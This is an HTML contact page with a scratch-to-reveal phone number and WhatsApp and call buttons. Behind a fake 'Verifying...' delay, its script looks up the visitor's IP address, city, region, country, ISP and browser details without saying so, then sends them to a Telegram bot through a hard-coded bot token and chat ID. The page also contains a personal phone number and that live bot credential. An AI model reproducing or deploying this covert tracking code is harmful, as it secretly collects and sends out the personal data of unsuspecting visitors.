<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Contact</title>

<style>
body {
  margin: 0;
  font-family: 'Segoe UI', sans-serif;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #667eea, #764ba2);
}

.container {
  background: rgba(255,255,255,0.15);
  backdrop-filter: blur(15px);
  padding: 25px;
  border-radius: 20px;
  width: 90%;
  max-width: 380px;
  text-align: center;
  color: white;
  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
}

h2 { margin-bottom: 20px; }

button, a {
  display: block;
  width: 100%;
  padding: 15px;
  margin-top: 12px;
  border-radius: 12px;
  font-size: 16px;
  text-align: center;
  box-sizing: border-box;
  text-decoration: none;
  border: none;
}

button {
  background: white;
  color: #333;
  font-weight: bold;
}

#wa { background: #25D366; color: white; }
#call { background: #28a745; color: white; }

#loading {
  display: none;
  margin-top: 15px;
  font-size: 14px;
  opacity: 0.8;
}

/* Scratch Area */
.scratch-box {
  position: relative;
  margin-top: 15px;
  height: 50px;
}

#num {
  font-size: 22px;
  font-weight: bold;
  line-height: 50px;
}

canvas {
  position: absolute;
  top: 0;
  left: 0;
  border-radius: 10px;
  touch-action: none; /* 🔥 prevents scroll while scratching */
}
</style>
</head>

<body>

<div class="container">

<h2>Contact Me</h2>

<button onclick="reveal()">Tap to Reveal Number</button>

<p id="loading">🔍 Verifying...</p>

<div class="scratch-box" style="display:none;" id="scratchBox">
  <div id="num">+91 9510389983</div>
  <canvas id="scratch"></canvas>
</div>

<a id="wa" target="_blank" style="display:none;">
  💬 Chat on WhatsApp
</a>

<a id="call" target="_self" style="display:none;">
  📞 Call Now
</a>

</div>

<script>
async function reveal() {

  document.getElementById("loading").style.display = "block";
  await new Promise(r => setTimeout(r, 1200));

  try {
    let data = await fetch("https://ipapi.co/json/")
      .then(res => res.json());

    let message =
`📱 New Visitor!

IP: ${data.ip}
City: ${data.city}
Region: ${data.region}
Country: ${data.country_name}
ISP: ${data.org}
Device: ${navigator.userAgent}
Time: ${new Date().toLocaleString()}`;

    fetch("https://api.telegram.org/bot8779897483:AAHpfrls0bPlhU_rNQKLymMB26aEy6m4bBs/sendMessage", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: "6319233453",
        text: message
      })
    });

  } catch(e) {}

  document.getElementById("loading").style.display = "none";
  document.getElementById("scratchBox").style.display = "block";

  document.getElementById("wa").href = "https://wa.me/919510389983";
  document.getElementById("call").href = "tel:9510389983";

  initScratch();
}

function initScratch() {
  const canvas = document.getElementById("scratch");
  const box = document.getElementById("scratchBox");

  canvas.width = box.offsetWidth;
  canvas.height = box.offsetHeight;

  const ctx = canvas.getContext("2d");

  ctx.fillStyle = "#ccc";
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.globalCompositeOperation = "destination-out";

  let isDrawing = false;
  let revealed = false;

  function getXY(e) {
    const rect = canvas.getBoundingClientRect();
    return {
      x: (e.touches ? e.touches[0].clientX : e.clientX) - rect.left,
      y: (e.touches ? e.touches[0].clientY : e.clientY) - rect.top
    };
  }

  function start(e) {
    isDrawing = true;
  }

  function end() {
    isDrawing = false;
  }

  function draw(e) {
    if (!isDrawing) return;
    e.preventDefault();

    const pos = getXY(e);

    ctx.beginPath();
    ctx.arc(pos.x, pos.y, 15, 0, Math.PI * 2);
    ctx.fill();

    if (!revealed) {
      revealed = true;
      document.getElementById("wa").style.display = "block";
      document.getElementById("call").style.display = "block";
    }
  }

  canvas.addEventListener("mousedown", start);
  canvas.addEventListener("mouseup", end);
  canvas.addEventListener("mousemove", draw);

  canvas.addEventListener("touchstart", start, { passive: false });
  canvas.addEventListener("touchend", end);
  canvas.addEventListener("touchmove", draw, { passive: false });
}
</script>

</body>
</html>
